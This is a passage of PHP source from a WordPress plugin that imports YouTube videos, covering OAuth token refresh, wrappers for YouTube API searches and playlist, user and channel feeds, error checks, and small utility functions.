	if( empty( $token[ 'client_id' ] ) || empty( $token[ 'client_secret' ] ) ){
		return new WP_Error( 'cbc_token_refresh_missing_oauth_login', __( 'YouTube API OAuth credentials missing. Please visit plugin Settings page and enter your credentials.', 'cbc_video' ) );
	}
	
	$endpoint = 'https://accounts.google.com/o/oauth2/token';
	$fields = array( 
			'client_id' => $token[ 'client_id' ], 
			'client_secret' => $token[ 'client_secret' ], 
			'refresh_token' => ( isset( $token[ 'refresh_token' ] ) ? $token[ 'refresh_token' ] : null ), 
			'grant_type' => 'refresh_token' 
	);
	$response = wp_remote_post( $endpoint, array( 
			'method' => 'POST', 
			'timeout' => 45, 
			'redirection' => 5, 
			'httpversion' => '1.0', 
			'blocking' => true, 
			'headers' => array(), 
			'body' => $fields, 
			'cookies' => array() 
	) );
	
	if( is_wp_error( $response ) ){
		return $response;
	}
	
	if( 200 != wp_remote_retrieve_response_code( $response ) ){
		$details = json_decode( wp_remote_retrieve_body( $response ), true );
		if( isset( $details[ 'error' ] ) ){
			return new WP_Error( 'cbc_invalid_yt_grant', sprintf( __( 'While refreshing the access token, YouTube returned error code <strong>%s</strong>. Please refresh tokens manually by revoking current access and granting new access.', 'cbc_video' ), $details[ 'error' ] ), $details );
		}
		return new WP_Error( 'cbc_token_refresh_error', __( 'While refreshing the access token, YouTube returned an unknown error.', 'cbc_video' ) );
	}
	
	$data = json_decode( wp_remote_retrieve_body( $response ), true );
	$token = array( 
			'value' => $data[ 'access_token' ], 
			'valid' => $data[ 'expires_in' ], 
			'time' => time() 
	);
	cbc_update_yt_oauth( false, false, $token );
	return $token;
}

/**
 * Get the OAuth bearer token
 * 
 * @return WP_Error|string - the bearer token or WP_Error
 */
function cbc_get_oauth_token(){
	$oauth_details = cbc_get_yt_oauth_details();
	if( ! isset( $oauth_details[ 'token' ] ) ){
		return new WP_Error( 'cbc_oauth_token_missing', __( 'Please visit plugin Settings page and setup the OAuth details to grant permission for the plugin to your YouTube account.', 'cbc_video' ) );
	}
	if( empty( $oauth_details[ 'client_id' ] ) || empty( $oauth_details[ 'client_secret' ] ) ){
		return new WP_Error( 'cbc_oauth_no_credentials', __( 'Please enter your OAuth credentials in order to be able to query your YouTube account.', 'cbc_video' ) );
	}
	// the token details
	$token = $oauth_details[ 'token' ];
	if( is_wp_error( $token ) ){
		return $token;
	}
	if( empty( $token[ 'value' ] ) ){
		return new WP_Error( 'cbc_oauth_token_empty', __( 'Please grant permission for the plugin to access your YouTube account.', 'cbc_video' ) );
	}
	
	$expired = time() >= ( $token[ 'valid' ] + $token[ 'time' ] );
	if( $expired ){
		$token = cbc_refresh_oauth_token();
	}
	
	if( is_wp_error( $token ) ){
		// remove the access token if refreshing returned error
		cbc_update_yt_oauth( false, false, '' );
		return $token;
	}
	
	return $token[ 'value' ];
}

/**
 * Checks if debug is on.
 * If on, the plugin will display various information in different admin areas
 */
function cbc_debug(){
	if( defined( 'CBC_DEBUG' ) ){
		return ( bool ) CBC_DEBUG;
	}
	return false;
}

/**
 * ***************************************
 * API query functions
 * ***************************************
 */

/**
 * Loads YouTube API query class
 */
function __load_youtube_api_class(){
	if( ! class_exists( 'YouTube_API_Query' ) ){
		require_once CBC_PATH . 'includes/libs/youtube-api-query.class.php';
	}
}

/**
 * Perform a YouTube search.
 * Arguments:
 * include_categories bool - when true, video categories will be retrieved, if false, they won't
 * query string - the search query
 * page_token - YT API 3 page token for pagination
 * order string - any of: date, rating, relevance, title, viewCount
 * duration string - any of: any, short, medium, long
 * 
 * @return array of videos or WP error
 */
function cbc_yt_api_search_videos( $args = array() ){
	$defaults = array( 
			// if false, YouTube categories won't be retrieved
			'include_categories' => true, 
			// the search query
			'query' => '', 
			// as of API 3, results pagination is done by tokens
			'page_token' => '', 
			// can be: date, rating, relevance, title, viewCount
			'order' => 'relevance', 
			// can be: any, short, medium, long
			'duration' => 'any', 
			// not used but into the script
			'embed' => 'any' 
	);
	
	$args = wp_parse_args( $args, $defaults );
	extract( $args, EXTR_SKIP );
	$settings = cbc_get_settings();
	$per_page = $settings[ 'manual_import_per_page' ];
	
	__load_youtube_api_class();
	$q = new YouTube_API_Query( $per_page, $include_categories );
	$videos = $q->search( $query, $page_token, array( 
			'order' => $order, 
			'duration' => $duration, 
			'embed' => $embed 
	) );
	$page_info = $q->get_list_info();
	
	return array( 
			'videos' => $videos, 
			'page_info' => $page_info 
	);
}

/**
 * Get videos for a given YouTube playlist.
 * Arguments:
 * include_categories bool - when true, video categories will be retrieved, if false, they won't
 * query string - the search query
 * page_token - YT API 3 page token for pagination
 * type string - auto or manual
 * 
 * @param array $args
 */
function cbc_yt_api_get_playlist( $args = array() ){
	$args[ 'playlist_type' ] = 'playlist';
	return cbc_yt_api_get_list( $args );
}

/**
 * Get videos for a given YouTube user.
 * Arguments:
 * include_categories bool - when true, video categories will be retrieved, if false, they won't
 * query string - the search query
 * page_token - YT API 3 page token for pagination
 * type string - auto or manual
 * 
 * @param array $args
 */
function cbc_yt_api_get_user( $args = array() ){
	$args[ 'playlist_type' ] = 'user';
	return cbc_yt_api_get_list( $args );
}

/**
 * Get videos for a given YouTube channel.
 * Arguments:
 * include_categories bool - when true, video categories will be retrieved, if false, they won't
 * query string - the search query
 * page_token - YT API 3 page token for pagination
 * type string - auto or manual
 * 
 * @param array $args
 */
function cbc_yt_api_get_channel( $args = array() ){
	$args[ 'playlist_type' ] = 'channel';
	return cbc_yt_api_get_list( $args );
}

/**
 * Get details about a single video ID
 * 
 * @param string $video_id - YouTube video ID
 */
function cbc_yt_api_get_video( $video_id ){
	__load_youtube_api_class();
	$q = new YouTube_API_Query( 1, true );
	$video = $q->get_video( $video_id );
	return $video;
}

/**
 * Get details about multiple video IDs
 * 
 * @param string $video_ids - YouTube video IDs comma separated or array of video ids
 */
function cbc_yt_api_get_videos( $video_ids ){
	__load_youtube_api_class();
	$q = new YouTube_API_Query( 50, true );
	$videos = $q->get_videos( $video_ids );
	return $videos;
}

/**
 * Returns a playlist feed.
 * include_categories bool - when true, video categories will be retrieved, if false, they won't
 * query string - the search query
 * page_token - YT API 3 page token for pagination
 * type string - auto or manual
 * playlist_type - one of the following: user, playlist or channel
 * 
 * @param array $args
 */
function cbc_yt_api_get_list( $args = array() ){
	$defaults = array( 
			'playlist_type' => 'playlist', 
			// can be auto or manual - will set pagination according to user settings
			'type' => 'manual', 
			// if false, YouTube categories won't be retrieved
			'include_categories' => true, 
			// the search query
			'query' => '', 
			// as of API 3, results pagination is done by tokens
			'page_token' => '' 
	);
	
	$args = wp_parse_args( $args, $defaults );
	extract( $args, EXTR_SKIP );
	
	$types = array( 
			'user', 
			'playlist', 
			'channel' 
	);
	if( ! in_array( $playlist_type, $types ) ){
		trigger_error( __( 'Invalid playlist type. Use as playlist type one of the following: user, playlist or channel.', 'cbc_video' ), E_USER_NOTICE );
		return;
	}
	
	$settings = cbc_get_settings();
	if( 'auto' == $type ){
		$per_page = $settings[ 'import_quantity' ];
	}else{
		$per_page = $settings[ 'manual_import_per_page' ];
	}
	
	__load_youtube_api_class();
	$q = new YouTube_API_Query( $per_page, $include_categories );
	switch( $playlist_type ){
		case 'playlist':
			$videos = $q->get_playlist( $query, $page_token );
		break;
		case 'user':
			$videos = $q->get_user_uploads( $query, $page_token );
		break;
		case 'channel':
			$videos = $q->get_channel_uploads( $query, $page_token );
		break;
	}
	
	$page_info = $q->get_list_info();
	
	return array( 
			'videos' => $videos, 
			'page_info' => $page_info 
	);
}

/**
 * Checks whether variable is a WP error in first place
 * and second will verifyis the error has YouTube flag on it.
 */
function cbc_is_youtube_error( $thing ){
	if( ! is_wp_error( $thing ) ){
		return false;
	}
	
	$data = $thing->get_error_data();
	if( $data && isset( $data[ 'youtube_error' ] ) ){
		return true;
	}
	
	return false;
}

/**
 * Callback function that removes some filters and actions before doing bulk imports
 * either manually of automatically.
 * Useful in case EWW Image optimizer is intalled; it will take a lot longer to import videos
 * if it processes the images.
 */
function cbc_remove_actions_on_bulk_import(){
	// remove EWW Optimizer actions to improve autoimport time
	remove_filter( 'wp_handle_upload', 'ewww_image_optimizer_handle_upload' );
	remove_filter( 'add_attachment', 'ewww_image_optimizer_add_attachment' );
	remove_filter( 'wp_image_editors', 'ewww_image_optimizer_load_editor', 60 );
	remove_filter( 'wp_generate_attachment_metadata', 'ewww_image_optimizer_resize_from_meta_data', 15 );
}
add_action( 'cbc_before_auto_import', 'cbc_remove_actions_on_bulk_import' );
add_action( 'cbc_before_thumbnails_bulk_import', 'cbc_remove_actions_on_bulk_import' );
add_action( 'cbc_before_manual_bulk_import', 'cbc_remove_actions_on_bulk_import' );

/**
 * A simple debug function.
 * Doesn't do anything special, only triggers an
 * action that passes the information along the way.
 * For actual debug messages, extra functions that process and hook to this action
 * are needed.
 */
function _cbc_debug_message( $message, $separator = "\n", $data = false ){
	/**
	 * Fires a debug message action
	 */
	do_action( 'cbc_debug_message', $message, $separator, $data );
}

/**
 * Utility functions
 */

/**
 * Get post type object instance
 * 
 * @return CBC_YouTube_Videos
 */
function cbc_get_class_instance(){
	global $CBC_POST_TYPE;
	return $CBC_POST_TYPE;
}

/**
 * Return registered video post type
 * 
 * @return string
 */
function cbc_get_post_type(){
	$obj = cbc_get_class_instance();
	return $obj->get_post_type();
}

/**
 * Return registered video category taxonomy
 * 
 * @return string
 */
function cbc_get_category_taxonomy(){
	$obj = cbc_get_class_instance();
	return $obj->get_post_tax();
}

/**
 * Return registered video tag taxonomy
 * 
 * @return string
 */
function cbc_get_tag_taxonomy(){
	$obj = cbc_get_class_instance();
	return $obj->get_post_tag_tax();
}
